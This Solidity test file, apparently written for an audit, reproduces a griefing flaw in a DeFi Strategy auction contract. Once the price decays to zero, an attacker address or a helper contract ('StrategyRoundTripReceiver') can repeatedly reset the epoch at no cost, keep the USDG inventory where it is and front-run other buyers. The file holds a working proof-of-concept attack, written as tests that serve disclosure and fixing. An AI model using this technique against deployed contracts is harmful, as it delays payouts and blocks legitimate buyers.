// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { Strategy } from "../../../../src/core/Strategy.sol";
import { ProtocolFixture } from "../../utils/ProtocolFixture.sol";

/// @notice Receives a zero-price Strategy inventory and returns it after `buy` completes in the same transaction.
/// @dev This models the bypass available even if Strategy rejects `revenueReceiver == address(this)`.
contract StrategyRoundTripReceiver {
    function resetAndReturn(Strategy strategy, IERC20 usdg) external {
        strategy.buy(address(this), strategy.epochId(), block.timestamp, 0);
        uint256 inventory = usdg.balanceOf(address(this));
        require(usdg.transfer(address(strategy), inventory), "RETURN_FAILED");
    }
}

/// @title StrategyInventoryRetentionGriefReproductionTest
/// @notice Reproduces repeatable zero-price resets that preserve a Strategy's USDG inventory.
contract StrategySelfReceiverGriefReproductionTest is ProtocolFixture {
    address private constant ATTACKER = address(0xBAD1);

    function setUp() external {
        _deployProtocol();
    }

    /// @notice A zero-price buyer can keep the complete inventory in place while repeatedly resetting the auction.
    /// @dev The configuration matches the launcher's GBX Strategy. Each iteration starts from the same reachable state:
    ///      nonzero USDG inventory, a fully decayed price, and an attacker with no GBX or allowance. The recurrence
    ///      continues after the seven-day revenue stream is exhausted, so it is not bounded by new revenue arriving.
    function test_Repro_ZeroPriceSelfReceiverCanRepeatedlyResetCanonicalEpochWithoutTokenCost() external {
        Strategy.Config memory config = Strategy.Config({
            initialPrice: 100_000 ether, epochDuration: 1 days, priceMultiplier: 1.2e18, minimumPrice: 100_000 ether
        });
        (address strategyAddress,,) = resonance.addStrategy(IERC20(address(gbx)), config);
        Strategy strategy = Strategy(strategyAddress);

        _signalDefault(ALICE, 100 ether);
        _signalOne(ALICE, strategyAddress);

        // A standard six-decimal USDG stream releasing exactly one raw unit per second.
        _routeRevenue(resonance.REWARD_DURATION());
        vm.warp(DEPLOYED_AT + strategy.epochDuration());

        uint256 maximumObservedGas;
        for (uint256 iteration; iteration < 8; ++iteration) {
            assertEq(strategy.currentPrice(), 0, "the active epoch is mature and publicly clearable for free");

            uint256 maturedEpoch = strategy.epochId();
            uint256 inventoryBefore = usdg.balanceOf(strategyAddress);
            vm.prank(ATTACKER);
            uint256 gasBefore = gasleft();
            uint256 paid = strategy.buy(strategyAddress, maturedEpoch, block.timestamp, 0);

            uint256 gasUsed = gasBefore - gasleft();
            if (gasUsed > maximumObservedGas) maximumObservedGas = gasUsed;
            if (iteration == 7) emit log_named_uint("post-stream attacker call gas", gasUsed);

            uint256 inventoryAfter = usdg.balanceOf(strategyAddress);
            uint256 expectedInventory = (iteration + 1) * 1 days;
            if (expectedInventory > resonance.REWARD_DURATION()) expectedInventory = resonance.REWARD_DURATION();

            assertEq(paid, 0);
            assertEq(inventoryAfter, expectedInventory, "the self-transfer retains all released USDG");
            assertGe(inventoryAfter, inventoryBefore, "inventory never clears during the grief sequence");
            assertEq(usdg.balanceOf(ATTACKER), 0, "the attacker does not receive the auction inventory");
            assertEq(gbx.balanceOf(ATTACKER), 0, "the attacker holds no payment token");
            assertEq(gbx.allowance(ATTACKER, strategyAddress), 0, "the attacker grants no payment allowance");
            assertEq(strategy.epochId(), maturedEpoch + 1);
            assertEq(strategy.initialPrice(), config.minimumPrice);
            assertEq(strategy.currentPrice(), config.minimumPrice, "the free fill restores the full configured floor");

            // A zero-bounded transaction visible in the public mempool loses if the attacker lands first.
            vm.prank(BOB);
            vm.expectRevert(abi.encodeWithSelector(Strategy.EpochIdMismatch.selector, maturedEpoch, maturedEpoch + 1));
            strategy.buy(BOB, maturedEpoch, block.timestamp, 0);

            // Refreshing the epoch does not restore the zero-price path in the same block.
            vm.prank(BOB);
            vm.expectRevert(abi.encodeWithSelector(Strategy.MaximumPaymentExceeded.selector, config.minimumPrice, 0));
            strategy.buy(BOB, maturedEpoch + 1, block.timestamp, 0);

            if (iteration != 7) vm.warp(block.timestamp + strategy.epochDuration());
        }

        emit log_named_uint("maximum observed attacker call gas", maximumObservedGas);
        assertEq(usdg.balanceOf(strategyAddress), resonance.REWARD_DURATION());
        assertEq(usdg.balanceOf(BOB), 0);

        // The behavior is repeatable delay, not an absolute freeze: a buyer willing to pay the reset floor can clear.
        _mintTestGBX(BOB, config.minimumPrice);
        vm.startPrank(BOB);
        gbx.approve(strategyAddress, config.minimumPrice);
        uint256 honestPayment = strategy.buy(BOB, strategy.epochId(), block.timestamp, config.minimumPrice);
        vm.stopPrank();

        assertEq(honestPayment, config.minimumPrice);
        assertEq(usdg.balanceOf(strategyAddress), 0);
        assertEq(usdg.balanceOf(BOB), resonance.REWARD_DURATION());
    }

    /// @notice A non-Strategy receiver can return the inventory after `buy`, bypassing a self-receiver-only check.
    function test_Repro_ReceiverContractCanRoundTripInventoryAndResetEpochWithoutTokenCost() external {
        Strategy.Config memory config = Strategy.Config({
            initialPrice: 100_000 ether, epochDuration: 1 days, priceMultiplier: 1.2e18, minimumPrice: 100_000 ether
        });
        (address strategyAddress,,) = resonance.addStrategy(IERC20(address(gbx)), config);
        Strategy strategy = Strategy(strategyAddress);
        StrategyRoundTripReceiver attacker = new StrategyRoundTripReceiver();

        _signalDefault(ALICE, 100 ether);
        _signalOne(ALICE, strategyAddress);
        _routeRevenue(resonance.REWARD_DURATION());

        for (uint256 iteration; iteration < 3; ++iteration) {
            vm.warp(block.timestamp + strategy.epochDuration());
            assertEq(strategy.currentPrice(), 0);

            uint256 epochBefore = strategy.epochId();
            uint256 inventoryBefore = usdg.balanceOf(strategyAddress);
            attacker.resetAndReturn(strategy, IERC20(address(usdg)));

            assertEq(strategy.epochId(), epochBefore + 1, "the zero-price purchase resets the epoch");
            assertEq(strategy.currentPrice(), config.minimumPrice, "the next epoch restarts at its floor");
            assertEq(usdg.balanceOf(address(attacker)), 0, "the helper retains no inventory");
            assertGe(
                usdg.balanceOf(strategyAddress), inventoryBefore, "the purchased inventory is returned to the Strategy"
            );
            assertEq(gbx.balanceOf(address(attacker)), 0, "the helper owns no payment asset");
            assertEq(gbx.allowance(address(attacker), strategyAddress), 0, "the helper grants no payment allowance");
        }
    }
}
